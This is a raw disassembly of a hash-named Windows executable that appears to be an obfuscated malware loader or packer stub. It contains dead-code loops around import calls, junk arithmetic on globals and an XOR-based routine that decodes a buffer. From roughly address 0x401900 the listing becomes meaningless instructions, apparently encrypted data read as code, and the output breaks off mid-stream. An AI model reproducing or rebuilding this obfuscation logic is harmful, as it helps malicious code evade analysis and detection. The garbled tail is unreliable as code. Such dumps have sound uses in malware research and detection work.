
67fef61fa8822ff992e4e1906a4b579fb57a2a4aa72c767d3335a79943d3ed76.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d1dc
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41ff3b
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ffb1
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ffd1
  401523:	push   0x41ff0b
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	mov    bl,0x43
  40190e:	lods   al,BYTE PTR ds:[esi]
  40190f:	adc    esp,DWORD PTR [edx+0x62]
  401912:	bound  esp,QWORD PTR [edx+0x1a]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401926:	jb     0x40199a
  401928:	jno    0x401954
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0xa5c989f1
  4019bd:	inc    eax
  4019be:	pop    ds
  4019bf:	outs   dx,BYTE PTR ds:[esi]
  4019c0:	dec    edx
  4019c1:	adc    al,BYTE PTR [eax]
  4019c3:	fucomip st,st(4)
  4019c5:	push   ebx
  4019c7:	lods   eax,DWORD PTR ds:[esi]
  4019c8:	cmp    DWORD PTR [ebp+0x2e],0x9
  4019cc:	mov    ch,0xfe
  4019ce:	jmp    FWORD PTR [edx-0x58]
  4019d1:	cmp    dl,BYTE PTR [eax+0x19]
  4019d4:	pop    es
  4019d5:	jg     0x4019ff
  4019d7:	xchg   edx,eax
  4019d8:	mov    ds,WORD PTR [ebx+eiz*1-0x6c]
  4019dc:	ss sbb al,0x50
  4019df:	out    0xc5,al
  4019e1:	imul   eax,DWORD PTR [edi],0xe83a12c7
  4019e7:	dec    ebp
  4019e8:	wrmsr  
  4019ea:	mov    esp,0xed1584ca
  4019ef:	push   ds
  4019f0:	lahf   
  4019f1:	add    al,0xd6
  4019f3:	stos   DWORD PTR es:[edi],eax
  4019f4:	cmc    
  4019f5:	or     eax,0x57e5bc0b
  4019fa:	out    dx,eax
  4019fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019fc:	jnp    0x4019a1
  4019fe:	adc    ch,BYTE PTR [esi+edx*8+0x64]
  401a02:	ins    DWORD PTR es:[edi],dx
  401a03:	jle    0x401a1d
  401a05:	or     BYTE PTR [edi-0x35b527c9],dl
  401a0b:	push   es
  401a0c:	sbb    al,BYTE PTR [edx+0x49c9ea02]
  401a12:	rol    al,0x8c
  401a15:	and    eax,0xa2c3bc90
  401a1a:	cdq    
  401a1b:	sub    BYTE PTR [ebp+eiz*8-0x7e91e384],bl
  401a22:	ins    DWORD PTR es:[edi],dx
  401a23:	inc    esi
  401a24:	pop    ebp
  401a25:	sbb    ch,bh
  401a27:	mov    eax,0x88228309
  401a2c:	add    eax,0x7cea3c79
  401a31:	imul   esp,DWORD PTR [ebp-0x25fb5ff5],0xdd251191
  401a3b:	les    edx,FWORD PTR [esi-0x2a]
  401a3e:	aas    
  401a3f:	xchg   BYTE PTR [ebp+0x20],bl
  401a42:	sbb    dh,dl
  401a44:	jmp    0x4fb8:0xc29bbfea
  401a4b:	mov    ch,BYTE PTR [eax]
  401a4d:	add    DWORD PTR [edi+edi*4-0x5ce12f2d],esi
  401a54:	stc    
  401a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a56:	push   ebx
  401a57:	jge    0x401a61
  401a59:	pop    ebx
  401a5a:	retf   0xf8a6
  401a5d:	jne    0x401aa7
  401a5f:	jmp    0xf7bc:0x80eecd42
  401a66:	mov    ds:0xbfad57a3,al
  401a6b:	jle    0x401a57
  401a6d:	sbb    al,0x32
  401a6f:	fdivr  st(3),st
  401a71:	push   edi
  401a72:	std    
  401a73:	mov    esi,esp
  401a75:	sbb    al,dl
  401a77:	xor    al,0xe3
  401a79:	inc    ebp
  401a7a:	les    eax,FWORD PTR [ebx+ecx*8-0x4c]
  401a7e:	push   edi
  401a7f:	fisttp QWORD PTR [eax+0x39894e52]
  401a85:	mov    WORD PTR [esi+0x7ca5a92a],?
  401a8b:	mul    ah
  401a8d:	xchg   edx,eax
  401a8e:	mov    bl,0x66
  401a90:	scas   al,BYTE PTR es:[edi]
  401a91:	(bad)  
  401a92:	jmp    0x6ffb:0xcce45910
  401a99:	jge    0x401acf
  401a9b:	jnp    0x401a74
  401a9d:	fimul  DWORD PTR [edi+0x5f]
